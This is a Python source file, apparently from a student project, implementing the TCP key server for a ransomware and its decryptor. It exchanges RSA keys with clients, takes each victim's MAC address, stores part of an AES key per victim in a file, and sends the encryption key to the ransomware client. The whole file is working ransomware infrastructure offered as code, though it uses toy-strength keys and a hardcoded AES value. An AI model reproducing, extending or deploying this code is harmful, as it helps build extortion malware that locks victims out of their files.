"""
This is a server.
Client (Ransomware) and Client (Decrypt) need to connect to a server in order
to get an AES key (Ransomware) or some part of the key (Decrypt).

Communications are established with TCP, ciphered with RSA & McElice.
Server stores in a file with the name of the MAC (of the ethernet card of the victim)
a part of the AES key. 
Althought, server sends the AES key to Ransomware ciphered.
Server sends the stored data to Desencrypt in order to make SHA-256(stored-data, PASSWORD)
to form the AES key which had been used by Ransomware.

Note: Ham(3,4) is used.

@author Adrian Galdeano (ags000) 
"""


from pickle import TRUE
import socket
import random
from Crypto.Util import number
from os.path import exists
from Crypto.Hash import SHA256
import McElice
import BcolorsT as bt
import time


class Serverc:

    

    # ip is a string like '10.10.10.1' and port a integer as 8080
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.e = None
        self.n = None
        self.d = None
        

        
    """
    Calculates RSA Keys 
    """
    def generate_rsa(self):
        

        p = number.getPrime(256)
        q = number.getPrime(256)
        f = (p-1) * (q-1)

        # e & n, they are the public key.
        e = 65537
        n = p*q

        self.e = e
        self.n = n

        # d is the private key
        d = pow(e, -1, f)

        self.d = d

    """
    Once Ransomware is detected 
    """
    def con_with_ransomware(self, connection, client_ip, bcol):
        

        print("RANSOMWARE HAS BEEN RECOGNISED")

        print(bcol.WARNING+"Server send its RSA public key:\n")
        print("n="+bcol.FAIL+"%d\n" %self.n)
        print(bcol.WARNING+"e="+bcol.FAIL+"%d\n" %self.e)

        # Send n & e (server-side)
        connection.send(bytes(str(self.n), 'utf8'))
        time.sleep(3)
        connection.sendall(bytes(str(self.e), 'utf8'))

        # Receive n from client ransomware
        data_temp = connection.recv(256)
        n_temp = str(data_temp, 'utf8')
        n_cliente = int(n_temp)
        print("n from rnsm OK.")
        
        # Receive e from client ransomware
        data_temp2 = connection.recv(256)
        e_temp = str(data_temp2, 'utf8')
        e_cliente = int(e_temp)
        print("e from rnsm OK.")


        print(bcol.WARNING+"Ransomware RSA public key:\n")
        print("n="+bcol.FAIL+"%d\n" %n_cliente)

        print(bcol.WARNING+"e="+bcol.FAIL+"%d" %e_cliente)

        print(bcol.WARNING+"Ransomware must send device's MAC. Waiting lecture...")


        # Receive MAC from ransomware.
        data_temp3 = connection.recv(1024)
        mac_temp_cifrada = str(data_temp3, 'utf8')
        mac_cliente_cifrada = int(mac_temp_cifrada)

        print("MAC rnsm OK")
        
        print(bcol.FAIL+"MAC ciphered with my RSA public key:"+ bcol.WARNING +"%d\n" %mac_cliente_cifrada)
        print(bcol.HEADER+"e*d mod f = 1, where d=%d" %self.d)
        print(bcol.WARNING+"Process of decrypt: Msg = msg_ciphered ^d mod F. MAC is:")
        mac_cliente = pow(mac_cliente_cifrada, self.d, self.n)
        print(mac_cliente)
        
        # we can identify the key of a device thanks to its MAC.
        PATH_ARCHIVO_MAC = str(mac_cliente)+".txt"

        # MAC already exists, connection ends.
        if(exists(PATH_ARCHIVO_MAC) == True):
            print("MAC is already stored...")
            connection.close()
            print("Shut down connection with RANSOMWARE")
            
            
        else:
            with open(PATH_ARCHIVO_MAC, "wb") as file:

                # Generate AES key
                #key_aes_ransom = number.getPrime(256) # random bytes.
                key_aes_ransom =62867337302737415647381182640189706785767844175227565903124771246950893045109
                
                """""
                print("THE AES KEY FOR HASH")
        
                
                THE_aES_key_for_hash = int.to_bytes(key_aes_ransom, 32,'little')

                mc2 = McElice.McElice(THE_aES_key_for_hash)
                list_encoded_key2 = mc2.encode()
            
            # Convert 1 and 0s to binary.

                bytes_pr = b''

                for vector in  list_encoded_key2:
                    
                    # Form a string like "00101110"
                    bits_cadena = ""
                    for entero in vector:
                        
                        bits_cadena = bits_cadena.__add__(str(entero))
                    
                    entero_de_bits = int(bits_cadena, 2)

                    bytes_pr = bytes_pr + entero_de_bits.to_bytes(1, 'little')

                # Once we get all the bytes. We have to send them .

                print("THE AES KEY FOR HASH ENCODED")
                print(bytes_pr)

                """
                h = SHA256.new(b"".join([int.to_bytes(key_aes_ransom,32,'little'), "TCYC2022".encode('utf8')]))

                # Store almost AES key (key_aes_ransom), but the key is the hash.
                file.write(int.to_bytes(key_aes_ransom, 32,'little'))
                clave = h.digest() # but now we send the full aes key to ransom for cipher process.
                print("AES KEY IS:")
                print(clave)
            file.close()

            # Send AES key ciphered with McELice.

            
            mc1 = McElice.McElice(clave)
            list_encoded_key = mc1.encode()
            
            # Convert 1 and 0s to binary.

            bytes_ = b''

            for vector in  list_encoded_key:
                
                # Form a string like "00101110"
                bits_cadena = ""
                for entero in vector:
               #     print(entero)
                    bits_cadena = bits_cadena.__add__(str(entero))
               # print("END OF VCTOR*****")
                entero_de_bits = int(bits_cadena, 2)

                bytes_ = bytes_ + entero_de_bits.to_bytes(1, 'little')

            # Once we get all the bytes. We have to send them .

            print("AES KEY ENCODED & CIPHERED WITH E VECTORS:")
            print(bytes_)
            time.sleep(5)
            connection.send(bytes_)
             #connection.sendall(bytes(str(self.e), 'utf8'))

        print("RANSOMWARE DISCONNECTED.")


    """
    Once Desencrypt is detected 
    """
    def con_with_desencript(self, connection, client_ip, bcol):

        print("DESENCRYPT HAS BEEN RECOGNISED")

        print(bcol.WARNING+"Server send its RSA public key:\n")
        print("n="+bcol.FAIL+"%d\n" %self.n)
        print(bcol.WARNING+"e="+bcol.FAIL+"%d\n" %self.e)

        # Send n & e (server-side)
        connection.send(bytes(str(self.n), 'utf8'))
        time.sleep(3)
        connection.sendall(bytes(str(self.e), 'utf8'))

        # Receive n from client desencript
        data_temp = connection.recv(256)
        n_temp = str(data_temp, 'utf8')
        n_cliente = int(n_temp)
        print("n from dsn OK.")
        
        # Receive e from client desencript
        data_temp2 = connection.recv(256)
        e_temp = str(data_temp2, 'utf8')
        e_cliente = int(e_temp)
        print("e from dsn OK.")


        print(bcol.WARNING+"Desencrypt RSA public key:\n")
        print("n="+bcol.FAIL+"%d\n" %n_cliente)

        print(bcol.WARNING+"e="+bcol.FAIL+"%d" %e_cliente)

        print(bcol.WARNING+"Desencrypt must send device's MAC. Waiting lecture...")


        # Receive MAC from desencript.
        data_temp3 = connection.recv(1024)
        mac_temp_cifrada = str(data_temp3, 'utf8')
        mac_cliente_cifrada = int(mac_temp_cifrada)

        print("MAC dsn OK")
        
        print(bcol.FAIL+"MAC ciphered with my RSA public key:"+ bcol.WARNING +"%d\n" %mac_cliente_cifrada)
        print(bcol.HEADER+"e*d mod f = 1, where d=%d" %self.d)
        print(bcol.WARNING+"Process of decrypt: Msg = msg_ciphered ^d mod F. MAC is:")
        mac_cliente = pow(mac_cliente_cifrada, self.d, self.n)
        print(mac_cliente)
        
        # we can identify the key of a device thanks to its MAC.
        PATH_ARCHIVO_MAC = str(mac_cliente)+".txt"

        with open(PATH_ARCHIVO_MAC, "rb") as file:
            bits_aes_for_hash = file.read()
        file.close()


        mc3 = McElice.McElice(bits_aes_for_hash)
        list_encoded_key = mc3.encode()
            
        # Convert 1 and 0s to binary.

        bytes_ = b''

        for vector in  list_encoded_key:
                
            # Form a string like "00101110"
            bits_cadena = ""
            for entero in vector:
         #           print(entero)
                    bits_cadena = bits_cadena.__add__(str(entero))
         #      print("END OF VCTOR*****")
            entero_de_bits = int(bits_cadena, 2)

            bytes_ = bytes_ + entero_de_bits.to_bytes(1, 'little')

        # Once we get all the bytes. We have to send them .

        print("PART OF AES KEY CIPHERED WITH MCELICE :")
        print(bytes_)
        time.sleep(5)
        connection.send(bytes_)
         

        print("DESENCRYPT DISCONNECTED")


    def start(self):
        bcol = bt.BcolorsT()
        # Server starts. Create socket TCP
        print("\n")
        print(bcol.OKGREEN+"**SERVER HAS STARTED SUCCESFULLY**")
        print(bcol.HEADER+"WAITING INCOMING CONNECTIONS...")

        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_socket.bind((self.ip, self.port)) # Ip of the computer that executes the server.
        tcp_socket.listen(1) 
        
        while(TRUE):
            (connection, client_ip) = tcp_socket.accept()
            print(bcol.WARNING+"A Client has been detected, IP: " + bcol.OKBLUE +str(client_ip))

            CONTROL_CLIENTE_BYTES = connection.recv(30)
            CONTROL_CLIENTE = str(CONTROL_CLIENTE_BYTES, 'utf8')

            if(CONTROL_CLIENTE == "Hola, soy el ransomware"):
                self.con_with_ransomware(connection, client_ip, bcol)

            elif (CONTROL_CLIENTE == "Hola, soy el desencriptador"):
                self.con_with_desencript(connection, client_ip, bcol)
            else:
                connection.close()
            

obj = Serverc("localhost", 8080)
obj.generate_rsa()
obj.start()